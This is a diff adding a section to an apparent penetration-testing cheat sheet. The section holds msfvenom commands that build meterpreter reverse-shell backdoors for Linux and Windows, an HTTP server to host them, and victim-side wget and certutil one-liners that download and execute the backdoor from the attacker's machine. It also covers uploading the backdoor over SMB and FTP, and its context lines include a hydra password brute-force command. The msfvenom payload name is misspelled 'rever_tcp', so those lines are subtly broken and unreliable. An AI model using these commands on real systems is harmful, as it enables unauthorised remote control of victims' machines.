@@ -302,3 +302,60 @@ nmap -p 3306 --script mysql-info <target_ip>
 ```bash
 hydra -L <user_file> -P <password_file> //<target_ip> mysql
 ```
+
+## Payload Generation and Delivery
+
+### MSFVenom Payloads Generation
+
+- Linux (ELF):
+
+    ```bash
+    msfvenom -p linux/meterpreter/rever_tcp LHOST=<attack_ip> LPORT=<random_port> -f elf -o backdoor.elf
+    ```
+
+- Windows (exe):
+
+    ```bash
+    msfvenom -p windows/meterpreter/rever_tcp LHOST=<attack_ip> LPORT=<random_port> -f exe -o backdoor.exe
+    ```
+
+### Payloads Delivery
+
+- Run a HTTP server on the attack machine
+
+    ```bash
+    python3 -m http.server 8080
+    ```
+
+- Linux Victim Download and Execution
+
+    ```bash
+    wget http://<attack_ip>/backdoor.elf -O /tmp/backdoor.elf && chmod +x /tmp/backdoor.elf && /tmp/backdoor.elf
+    ```
+
+- Windows Victim Download and Execution
+
+    ```cmd
+    certutil -urlcache -split -f http://<attack_ip>/backdoor.exe C:\Windows\Temp\backdoor.exe && C:\Windows\Temp\backdoor.exe
+    ```
+
+- Deliver Through SMB Services
+
+    ```bash
+    smbclient //<target_ip>/<ShareName> -N
+    put backdoor.exe
+    ```
+    OR
+    ```bash
+    smbclient //<target_ip>/<ShareName> -U 'username%password'
+    put backdoor.exe
+    ```
+
+- Deliver Through FTP Service
+
+    ```bash
+    ftp <target_ip>
+    ftp > binary
+    ftp > put backdoor.exe
+    ```
+
